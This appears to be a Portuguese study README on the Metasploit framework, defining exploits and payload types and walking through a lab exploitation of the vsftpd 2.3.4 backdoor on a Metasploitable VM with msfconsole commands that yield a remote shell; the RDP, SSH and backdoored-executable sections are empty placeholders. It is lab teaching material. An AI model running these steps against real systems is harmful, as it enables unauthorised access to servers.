# FRAMEWORK METASPLOIT

**Metasploit** é uma plataforma de segurança cibernética usada principalmente para realizar testes de penetração e avaliações de segurança em sistemas de computadores e redes.  
Ele fornece uma coleção de ferramentas e exploits que permitem que profissionais de segurança identifiquem, explorem e documentem vulnerabilidades em sistemas-alvo.  
Um **exploit** é um programa, código ou técnica usado para aproveitar uma vulnerabilidade ou falha de segurança em um sistema, software ou rede.  
O objetivo principal de um exploit é explorar uma falha para realizar ataque.  

**Payload** é um código ou programa malicioso que é entregue e executado após a exploração de uma vulnerabilidade em um sistema  
- *single* = payload completo que realiza todas as acções (conexão inicial e ataque), sem precisar de etapas adicionais
- *stager* = payload pequeno que estabelece apenas a conexão inicial entre o atacante e o alvo
- *stage* = o payload que contém as ações do atacante, e pode ser carregado após o stager estabelecer a comunicação.  
**Meterpreter**, é um payload que funciona por injeção dll, é uma ferramenta “pós invasão”, para testes de penetração e ataques éticos.

  
Para realização dos estudos, utilizei o **mfsconsole**
- Interface de linha de comando do Metasploit
- Permite a execução de exploit, payloads, post-exploration e muito mais

Abaixo, todos os casos de estudo:
- [EXPLORANDO FALHAS NO FTP](#explorando-falhas-no-ftp)
- [ATAQUES DOS NO WINDOWS RDP](#ataques-dos-no-windows-rdp)
- [EXPLORANDO FALHAS NO SSH](#explorando-falhas-no-ssh)
- [ADICIONANDO BACKDOOR EM UM EXECUTÁVEL](#adicionando-backdoor-em-um-executavel)

---

## EXPLORANDO FALHAS NO FTP
Neste exemplo, iremos explorar uma falha na versão 2.3.4 do vsftpd que introduz uma backdoor no servidor FTP.  
Iremos utilizar o Metasploitable como alvo, e o Kali como origem do ataque.  
Estou utilizando os dois sistemas em máquinas virtuais.  

Primeiramente criei um arquivo *teste.txt* no Metasploitable para que possamos manipulá-lo após a invasão.  
No Kali, abriremos o console, entraremos no modo `sudo su` seguiremos os seguintes passos:  
- `msfconsole` = abre o console do metasploit  
- `search vsftpd`  
- `info exploit/unix/ftp/vsftpd_234_hackdoor`  
- `use exploit/unix/ftp/vsftpd_234_hackdoor` = selecionamos o exploit para uso  
- `show options` = mostra os requerimentos que precisamos definir no exploit  
- `set rhosts <ip do metaspoitable>` = ip do nosso alvo  
- `show payloads` = lista os payloads disponíveis  
- `set payload payload/cmd/unix/interact` = este payload permite que o atacante tenha um controle direto sobre a máquina invadida após o exploit  
- `show options` = para ver se os requerimentos estão definidos  
- `exploit`   
- `ls` = irá mostrar o diretório que estamos.  
- `ip addr` = vai mostra o ip da maquina que invadimos.  
E assim, estamos com acesso ao alvo, via terminal.  

---

## ATAQUES DOS NO WINDOWS RDP
...

---

## EXPLORANDO FALHAS NO SSH
...

---

## ADICIONANDO BACKDOOR EM UM EXECUTÁVEL
...
